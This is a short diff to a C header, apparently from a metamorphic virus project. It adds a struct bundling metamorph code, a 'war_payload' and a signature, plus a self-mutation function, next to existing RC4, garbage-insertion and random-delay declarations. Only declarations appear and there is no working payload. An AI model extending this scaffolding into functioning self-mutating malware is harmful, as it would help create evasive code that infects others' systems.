@@ -22,6 +22,19 @@ extern long long pepino;
 #define SYS_CUSTOM_OPEN 6767
 #define SYS_CUSTOM_CLOSE 9696
 #define MAX_SIGNATURE_LEN 128
+// En war.h
+typedef struct {
+    unsigned char *metamorph;
+    size_t metamorph_size;
+    
+    unsigned char *war_payload;
+    size_t war_size;
+    
+    unsigned char *signature;
+    size_t sig_size;
+    
+    size_t total_size;
+} s_virus_components;
 typedef struct
 {
 	void *data;
@@ -62,4 +75,5 @@ void insert_garbage2(void);
 int get_execution_order(void);
 void random_delay(void);
 void rc4_crypt(unsigned char *data, size_t datalen, const unsigned char *key, size_t keylen);
+void metamorph_mutate_self(void);
 #endif
